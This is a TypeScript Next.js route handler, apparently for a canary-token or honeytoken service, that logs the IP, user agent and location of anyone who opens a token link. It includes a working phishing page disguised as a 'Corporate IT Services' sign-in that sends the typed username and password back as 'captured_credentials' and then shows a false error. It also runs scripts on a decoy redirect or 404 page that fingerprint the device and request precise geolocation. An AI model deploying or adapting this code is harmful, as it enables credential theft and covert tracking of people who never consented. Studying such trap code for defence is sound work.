import { NextRequest, NextResponse } from 'next/server';
import { createAlert, getToken } from '@/lib/storage';

const transparentPixel = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

export const dynamic = 'force-dynamic';

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const resolvedParams = await params;
  const token_id = resolvedParams.id;

  const vercelForwarded = request.headers.get('x-vercel-forwarded-for');
  const forwardedFor = request.headers.get('x-forwarded-for');
  const realIp = request.headers.get('x-real-ip');
  
  const attacker_ip = (vercelForwarded ? vercelForwarded.split(',')[0].trim() : null) || 
                      (forwardedFor ? forwardedFor.split(',')[0].trim() : null) || 
                      realIp || 
                      'Unknown IP';
  const user_agent = request.headers.get('user-agent') || 'Unknown User-Agent';
  
  const city = request.headers.get('x-vercel-ip-city') || '';
  const country = request.headers.get('x-vercel-ip-country') || '';
  const lat = request.headers.get('x-vercel-ip-latitude') || '';
  const lon = request.headers.get('x-vercel-ip-longitude') || '';
  
  let location = city && country ? `${city}, ${country}` : (country || 'Unknown Location');
  if (lat && lon) {
    location += ` (${lat}, ${lon})`;
  }

  // Supplement location data using ip-api.com with strict 1.5s timeout so request never hangs
  if (location === 'Unknown Location' && attacker_ip !== 'Unknown IP' && attacker_ip !== '127.0.0.1' && attacker_ip !== '::1' && attacker_ip !== '::ffff:127.0.0.1') {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 1500);
      const res = await fetch(`http://ip-api.com/json/${attacker_ip}`, { signal: controller.signal });
      clearTimeout(timeoutId);
      if (res.ok) {
        const data = await res.json();
        if (data.status === 'success') {
          location = `${data.city}, ${data.regionName}, ${data.country}`;
          if (data.isp) location += ` - ISP: ${data.isp}`;
        }
      }
    } catch(err) {
      // Ignore external IP lookup timeout or failure quietly
    }
  }

  let alertId = '';
  try {
    const alert = await createAlert(token_id, attacker_ip, user_agent, location);
    alertId = alert.id;
  } catch (err) {
    console.error('Exception logging alert:', err);
  }

  const token = await getToken(token_id);
  
  const accept = request.headers.get('accept') || '';
  const isHtmlRequest = accept.includes('text/html');
  
  let finalUrl = token?.redirect_url || '';
  if (finalUrl && !finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
    finalUrl = 'https://' + finalUrl;
  }

  const payloadType = token?.payload_type || 'invisible';

  if (isHtmlRequest) {
    if (payloadType === 'fake_login') {
      const loginHtml = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure IT Portal - Sign In</title>
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f3f2f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
          .login-box { background: white; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); width: 100%; max-width: 360px; }
          .logo { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-bottom: 24px; }
          .title { font-size: 24px; font-weight: 600; margin-bottom: 16px; color: #1b1b1b; }
          .input-group { margin-bottom: 16px; }
          input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #666; border-radius: 0; box-sizing: border-box; font-size: 15px; }
          input[type="text"]:focus, input[type="password"]:focus { outline: 1px solid #0067b8; border-color: #0067b8; }
          .btn { background-color: #0067b8; color: white; border: none; padding: 10px 32px; font-size: 15px; cursor: pointer; float: right; margin-top: 16px; }
          .btn:hover { background-color: #005da6; }
          .footer-links { margin-top: 40px; font-size: 13px; color: #0067b8; clear: both; }
          #error-msg { color: #e81123; font-size: 14px; margin-bottom: 16px; display: none; }
        </style>
      </head>
      <body>
        <div class="login-box">
          <div class="logo">Corporate IT Services</div>
          <div class="title">Sign in</div>
          <div id="error-msg">Incorrect user ID or password. Type the correct user ID and password, and try again.</div>
          <form id="loginForm">
            <div class="input-group">
              <input type="text" id="username" placeholder="someone@example.com" required>
            </div>
            <div class="input-group" id="pass-group" style="display:none;">
              <input type="password" id="password" placeholder="Password">
            </div>
            <button type="button" class="btn" id="nextBtn">Next</button>
            <button type="submit" class="btn" id="submitBtn" style="display:none;">Sign in</button>
          </form>
          <div class="footer-links">Can't access your account?</div>
        </div>

        <script>
          const form = document.getElementById('loginForm');
          const nextBtn = document.getElementById('nextBtn');
          const submitBtn = document.getElementById('submitBtn');
          const usernameInput = document.getElementById('username');
          const passwordInput = document.getElementById('password');
          const passGroup = document.getElementById('pass-group');
          const errorMsg = document.getElementById('error-msg');

          nextBtn.addEventListener('click', () => {
            if (usernameInput.value.trim() !== '') {
              passGroup.style.display = 'block';
              nextBtn.style.display = 'none';
              submitBtn.style.display = 'block';
              passwordInput.focus();
            }
          });

          form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = usernameInput.value;
            const password = passwordInput.value;
            
            try {
              await fetch('/api/v1/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                  alert_id: '${alertId}', 
                  details: { captured_credentials: username + ':' + password } 
                })
              });
            } catch(err) {}

            errorMsg.style.display = 'block';
            passwordInput.value = '';
          });

          // Telemetry Script
          (async function() {
            try {
              let device_model = '';
              let os_platform = navigator.platform || '';
              let gpu_renderer = '';
              let battery_level = '';
              let connection_type = '';
              let touch_points = navigator.maxTouchPoints || 0;
              let exact_lat = null;
              let exact_lon = null;
              let local_ip = null;
              let threat_id = 'Unknown';
              
              try {
                if (navigator.geolocation) {
                  navigator.geolocation.getCurrentPosition(
                    (pos) => {
                      fetch('/api/v1/event', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ alert_id: '${alertId}', details: { exact_lat: pos.coords.latitude, exact_lon: pos.coords.longitude } })
                      }).catch(()=>({}));
                    },
                    (err) => {},
                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
                  );
                }
              } catch(e) {}
              
              if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                  const entropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                  device_model = entropy.model || '';
                  if (entropy.platform) {
                    os_platform = entropy.platform;
                    if (entropy.platformVersion) os_platform += ' ' + entropy.platformVersion;
                  }
                } catch(e) {}
              }

              const details = {
                hardware_concurrency: navigator.hardwareConcurrency,
                device_memory: navigator.deviceMemory,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen_resolution: window.screen.width + 'x' + window.screen.height,
                device_model: device_model,
                os_platform: os_platform,
                gpu_renderer: gpu_renderer,
                battery_level: battery_level,
                connection_type: connection_type,
                touch_points: touch_points,
                exact_lat: exact_lat,
                exact_lon: exact_lon,
                local_ip: local_ip,
                threat_id: threat_id
              };
              
              await fetch('/api/v1/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ alert_id: '${alertId}', details })
              });
            } catch(e) {}
          })();
        </script>
      </body>
      </html>
      `;
      return new Response(loginHtml, { 
        headers: { 'Content-Type': 'text/html', 'Cache-Control': 'no-store, no-cache, must-revalidate' }
      });
    }

    // Standard HTML payload (Redirect or Benign 404 landing page)
    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>${finalUrl ? 'Redirecting...' : '404 Not Found'}</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f8f9fa; color: #212529; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
        .container { max-width: 500px; background: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
        h1 { font-size: 48px; margin: 0 0 10px; color: #dc3545; }
        p { font-size: 16px; color: #6c757d; margin: 0 0 20px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      </style>
    </head>
    <body>
      <div class="container" id="content">
        ${finalUrl ? `
          <div class="spinner"></div>
          <p>Redirecting to requested resource...</p>
        ` : `
          <h1>404</h1>
          <p>The document or resource you are looking for has expired or is no longer available.</p>
        `}
      </div>

      <script>
        (async function() {
          window.redirectTriggered = false;
          window.doRedirect = () => {
            ${finalUrl ? `
              if (!window.redirectTriggered) {
                window.redirectTriggered = true;
                window.location.replace('${finalUrl}');
              }
            ` : `
              // No redirect configured, benign 404 displayed
            `}
          };

          ${finalUrl ? `window.fallbackTimer = setTimeout(window.doRedirect, 2500);` : ``}

          let alertId = '${alertId}';
          try {
            let device_model = '';
            let os_platform = navigator.platform || '';
            let gpu_renderer = '';
            let battery_level = '';
            let connection_type = '';
            let touch_points = navigator.maxTouchPoints || 0;
            
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
              try {
                const entropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                device_model = entropy.model || '';
                if (entropy.platform) {
                  os_platform = entropy.platform;
                  if (entropy.platformVersion) os_platform += ' ' + entropy.platformVersion;
                }
              } catch(e) {}
            }

            let exact_lat = null;
            let exact_lon = null;
            let local_ip = null;
            let threat_id = 'Unknown';
            let color_depth = window.screen.colorDepth || 24;
            let dark_mode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
            let referrer = document.referrer || '';

            const details = {
              hardware_concurrency: navigator.hardwareConcurrency,
              device_memory: navigator.deviceMemory,
              language: navigator.language,
              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
              screen_resolution: window.screen.width + 'x' + window.screen.height,
              device_model: device_model,
              os_platform: os_platform,
              gpu_renderer: gpu_renderer,
              battery_level: battery_level,
              connection_type: connection_type,
              touch_points: touch_points,
              color_depth: color_depth,
              dark_mode: dark_mode,
              referrer: referrer
            };

            // Fast async telemetry beacon
            if (navigator.sendBeacon) {
              navigator.sendBeacon('/api/v1/event', JSON.stringify({ alert_id: alertId, details }));
            } else {
              fetch('/api/v1/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ alert_id: alertId, details }),
                keepalive: true
              }).catch(()=>{});
            }

            // Quick Geolocation check without blocking redirect
            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(
                (pos) => {
                  fetch('/api/v1/event', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    keepalive: true,
                    body: JSON.stringify({ alert_id: alertId, details: { exact_lat: pos.coords.latitude, exact_lon: pos.coords.longitude } })
                  }).catch(()=>{}).finally(() => {
                    if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
                    window.doRedirect();
                  });
                },
                (err) => {
                  if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
                  window.doRedirect();
                },
                { enableHighAccuracy: false, timeout: 2000, maximumAge: 0 }
              );
            } else {
              if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
              window.doRedirect();
            }

          } catch(e) {
            if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
            window.doRedirect();
          }
        })();
      </script>
    </body>
    </html>
    `;
    
    return new Response(html, { 
      headers: { 
        'Content-Type': 'text/html',
        'Cache-Control': 'no-store, no-cache, must-revalidate'
      }
    });
  }

  if (finalUrl) {
    try {
      new URL(finalUrl);
      return NextResponse.redirect(finalUrl, 302);
    } catch (e) {
      console.error('Invalid redirect URL:', finalUrl);
    }
  }

  return new Response(transparentPixel, {
    status: 200,
    headers: {
      'Content-Type': 'image/gif',
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}
